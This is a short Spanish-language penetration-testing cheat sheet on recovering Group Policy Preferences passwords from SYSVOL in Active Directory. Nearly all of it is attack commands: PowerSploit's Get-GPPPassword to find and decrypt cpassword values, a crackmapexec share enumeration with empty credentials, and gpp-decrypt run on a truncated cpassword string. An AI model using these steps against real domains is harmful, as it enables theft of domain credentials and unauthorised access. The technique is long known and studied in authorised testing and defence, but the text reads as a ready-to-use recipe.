SYSVOL GPP Password

Las Group Policy Preferences antiguas podían almacenar cpassword en XML dentro de SYSVOL o rutas replicadas similares.

PowerSploit

PowerShell: Powersploit usamos la función Get-GPPPassword

# Analiza archivos XML en la carpeta Policies SYSVOL, selecciona cpassword y la descifra
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

# Posible Ruta: "ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"

Kali

Kali: Buscar cpassword en ficheros .xml de SYSVOL

# Enumerar SYSVOL (Estructura: DfsrPrivate, Policies, scripts)
crackmapexec smb <ip_target> -u '' -p '' --shares
# Buscar en ficheros .xml parámetros cpassword
# Crackear cpassword con gpp-decrypt
gpp-decrypt qRI/NPQtItG....hBZ/XShO2IZ80

Aviso: El recurso Replication tiene una estructura similar a la de `SYSVOL

Aviso: Buscar en archivos .xml como Groups.xml el atributo cpassword
